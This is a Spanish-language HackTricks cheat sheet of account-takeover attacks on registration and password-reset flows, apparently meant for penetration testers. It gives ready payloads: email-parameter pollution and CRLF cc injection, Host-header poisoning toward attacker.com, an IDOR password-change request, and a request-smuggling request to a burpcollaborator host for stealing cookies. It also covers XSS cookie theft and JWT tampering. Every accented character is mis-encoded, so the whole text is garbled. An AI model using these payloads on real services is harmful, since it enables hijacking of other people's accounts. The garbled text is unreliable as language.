# Vulnerabilidades de Registro y Adquisici칩n

<details>

<summary><strong>Aprende a hackear AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repos de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Adquisici칩n de Registro

### Registro Duplicado

* Intenta generar usando un nombre de usuario existente
* Verifica variando el correo electr칩nico:
* may칰sculas
* \+1@
* a침ade algo en el correo electr칩nico
* caracteres especiales en el nombre del correo electr칩nico (%00, %09, %20)
* Pon caracteres en blanco despu칠s del correo electr칩nico: `test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### Enumeraci칩n de Nombres de Usuario

Verifica si puedes determinar cu치ndo un nombre de usuario ya ha sido registrado dentro de la aplicaci칩n.

### Pol칤tica de Contrase침as

Al crear un usuario verifica la pol칤tica de contrase침as (comprueba si puedes usar contrase침as d칠biles).\
En ese caso, podr칤as intentar fuerza bruta para obtener las credenciales.

### Inyecci칩n SQL

[**Consulta esta p치gina**](sql-injection/#insert-statement) para aprender c칩mo intentar adquisiciones de cuenta o extraer informaci칩n a trav칠s de **Inyecciones SQL** en formularios de registro.

### Adquisiciones de Oauth

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### Vulnerabilidades de SAML

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Cambio de Correo Electr칩nico

Cuando est칠s registrado intenta cambiar el correo electr칩nico y verifica si este cambio est치 correctamente validado o si puedes cambiarlo por correos electr칩nicos arbitrarios.

### M치s Comprobaciones

* Verifica si puedes usar **correos electr칩nicos desechables**
* **Contrase침a larga** (>200) puede provocar **DoS**
* **Verifica los l칤mites de tasa en la creaci칩n de cuentas**
* Usa username@**burp\_collab**.net y analiza el **callback**

## **Adquisici칩n de Restablecimiento de Contrase침a**

### Fuga del Token de Restablecimiento de Contrase침a a trav칠s del Referente <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Solicita el restablecimiento de la contrase침a a tu direcci칩n de correo electr칩nico
2. Haz clic en el enlace de restablecimiento de contrase침a
3. No cambies la contrase침a
4. Haz clic en cualquier sitio web de terceros (por ejemplo: Facebook, Twitter)
5. Intercepta la solicitud en el proxy de Burp Suite
6. Verifica si la cabecera del referente est치 filtrando el token de restablecimiento de contrase침a.

### Envenenamiento de Restablecimiento de Contrase침a <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercepta la solicitud de restablecimiento de contrase침a en Burp Suite
2. A침ade o edita las siguientes cabeceras en Burp Suite: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Env칤a la solicitud con la cabecera modificada\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Busca una URL de restablecimiento de contrase침a basada en la _cabecera del host_ como: `https://attacker.com/reset-password.php?token=TOKEN`

### Restablecimiento de Contrase침a a trav칠s del Par치metro de Correo Electr칩nico <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR en Par치metros de API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. El atacante debe iniciar sesi칩n con su cuenta e ir a la funci칩n **Cambiar contrase침a**.
2. Iniciar Burp Suite e Intercepta la solicitud
3. Env칤ala a la pesta침a repetidor y edita los par치metros: ID de usuario/correo electr칩nico\
`powershell POST /api/changepass [...] ("form": {"email":"victima@email.com","password":"securepwd"})`

### Token de Restablecimiento de Contrase침a D칠bil <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

El token de restablecimiento de contrase침a debe generarse de manera aleatoria y ser 칰nico cada vez.\
Intenta determinar si el token expira o si siempre es el mismo, en algunos casos el algoritmo de generaci칩n es d칠bil y puede ser adivinado. Las siguientes variables podr칤an ser utilizadas por el algoritmo.

* Timestamp
* UserID
* Email del Usuario
* Nombre y Apellido
* Fecha de Nacimiento
* Criptograf칤a
* Solo N칰meros
* Secuencia de token peque침a (caracteres entre \[A-Z,a-z,0-9])
* Reutilizaci칩n de token
* Fecha de expiraci칩n del token

### Fuga de Token de Restablecimiento de Contrase침a <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Genera una solicitud de restablecimiento de contrase침a usando la API/UI para un correo electr칩nico espec칤fico, por ejemplo: test@mail.com
2. Inspecciona la respuesta del servidor y busca `resetToken`
3. Luego usa el token en una URL como `https://example.com/v3/user/password/reset?resetToken=[EL_RESET_TOKEN]&email=[EL_CORREO]`

### Restablecimiento de Contrase침a V칤a Colisi칩n de Nombre de Usuario <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Reg칤strate en el sistema con un nombre de usuario id칠ntico al del usuario v칤ctima, pero con espacios en blanco insertados antes y/o despu칠s del nombre de usuario, por ejemplo: `"admin "`
2. Solicita un restablecimiento de contrase침a con tu nombre de usuario malicioso.
3. Usa el token enviado a tu correo electr칩nico y restablece la contrase침a de la v칤ctima.
4. Con칠ctate a la cuenta de la v칤ctima con la nueva contrase침a.

La plataforma CTFd fue vulnerable a este ataque.\
Ver: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Toma de Control de Cuenta V칤a Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Encuentra un XSS dentro de la aplicaci칩n o un subdominio si las cookies est치n limitadas al dominio principal: `*.domain.com`
2. Fuga la **cookie de sesi칩n** actual
3. Autent칤cate como el usuario utilizando la cookie

### Toma de Control de Cuenta V칤a HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. Usa **smuggler** para detectar el tipo de HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. Elabora una solicitud que sobrescribir치 el `POST / HTTP/1.1` con los siguientes datos:\
`GET http://algo.burpcollaborator.net HTTP/1.1 X:` con el objetivo de redirigir a las v칤ctimas a burpcollab y robar sus cookies\
3\. La solicitud final podr칤a verse como la siguiente
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Informes de Hackerone que explotan este bug
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Toma de control de cuenta v칤a CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Crear un payload para el CSRF, por ejemplo: "Formulario HTML con autoenv칤o para cambio de contrase침a"
2. Enviar el payload

### Toma de control de cuenta v칤a JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

El JSON Web Token podr칤a usarse para autenticar a un usuario.

* Editar el JWT con otro ID de Usuario / Email
* Verificar la firma d칠bil del JWT

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## Referencias

* [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
